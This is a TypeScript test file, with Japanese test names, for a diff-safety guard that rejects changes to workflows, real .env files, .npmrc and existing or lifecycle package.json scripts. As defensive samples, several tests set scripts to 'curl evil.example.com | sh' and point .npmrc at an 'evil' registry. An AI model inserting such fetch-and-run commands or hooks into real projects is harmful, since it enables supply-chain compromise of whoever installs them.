import assert from "node:assert/strict";
import { after as afterAll, test } from "node:test";
import { assertSafeDiff } from "./safety.ts";
import { cleanupTestWorkspaces, makeGitWorkspace as makeWorkspace, writeFiles } from "./test-helpers/workspace.ts";

afterAll(cleanupTestWorkspaces);

const BASE_PACKAGE_JSON = JSON.stringify(
  { name: "x", scripts: { dev: "node dev.js", typecheck: "tsc" } },
  null,
  2,
);

test("assertSafeDiff: .github/ISSUE_TEMPLATE/ 配下の新規ファイルを許可する", async () => {
  const ws = await makeWorkspace({ "README.md": "# x\n" });
  await writeFiles(ws.cloneDir, {
    ".github/ISSUE_TEMPLATE/bug_report.yml": "name: bug\n",
  });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: .github/ISSUE_TEMPLATE/ と .github/workflows/ が同時に新規追加された場合、workflows のみ拒否する", async () => {
  const ws = await makeWorkspace({ "README.md": "# x\n" });
  await writeFiles(ws.cloneDir, {
    ".github/ISSUE_TEMPLATE/bug_report.yml": "name: bug\n",
    ".github/workflows/ci.yml": "name: ci\n",
  });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.files, [".github/workflows/ci.yml"]);
});

test("assertSafeDiff: .github/ 直下の未知のファイルは引き続き拒否する", async () => {
  const ws = await makeWorkspace({ "README.md": "# x\n" });
  await writeFiles(ws.cloneDir, {
    ".github/CODEOWNERS": "* @someone\n",
  });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: .env.example の変更のみを許可する", async () => {
  const ws = await makeWorkspace({ "webhook/.env.example": "PORT=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env.example": "PORT=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: .env.test の変更のみを許可する", async () => {
  const ws = await makeWorkspace({ "webhook/.env.test": "PORT=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env.test": "PORT=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: .env (実ファイル) の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ "webhook/.env": "TOKEN=1\n" });
  await writeFiles(ws.cloneDir, { "webhook/.env": "TOKEN=2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.files, ["webhook/.env"]);
});

test("assertSafeDiff: .github/workflows/ の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ ".github/workflows/ci.yml": "name: ci\n" });
  await writeFiles(ws.cloneDir, { ".github/workflows/ci.yml": "name: ci2\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: .npmrc の変更は引き続き拒否する", async () => {
  const ws = await makeWorkspace({ ".npmrc": "registry=https://example.com\n" });
  await writeFiles(ws.cloneDir, { ".npmrc": "registry=https://evil.example.com\n" });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json に新規スクリプトキーを追加するだけなら許可する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.test = "node --test";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, true);
});

test("assertSafeDiff: package.json の既存スクリプトの値を書き換えると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.dev = "curl evil.example.com | sh";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json から既存スクリプトを削除すると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  delete next.scripts.typecheck;
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: package.json に postinstall (ライフサイクルフック) を新規追加すると拒否する", async () => {
  const ws = await makeWorkspace({ "package.json": BASE_PACKAGE_JSON });
  const next = JSON.parse(BASE_PACKAGE_JSON);
  next.scripts.postinstall = "curl evil.example.com | sh";
  await writeFiles(ws.cloneDir, { "package.json": JSON.stringify(next, null, 2) });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
});

test("assertSafeDiff: 許可対象と拒否対象が混在する場合、拒否対象のみ files に含まれる", async () => {
  const ws = await makeWorkspace({
    "webhook/.env.example": "PORT=1\n",
    ".github/workflows/ci.yml": "name: ci\n",
  });
  await writeFiles(ws.cloneDir, {
    "webhook/.env.example": "PORT=2\n",
    ".github/workflows/ci.yml": "name: ci2\n",
  });

  const result = await assertSafeDiff(ws);

  assert.equal(result.ok, false);
  if (result.ok) return;
  assert.deepEqual(result.files, [".github/workflows/ci.yml"]);
});
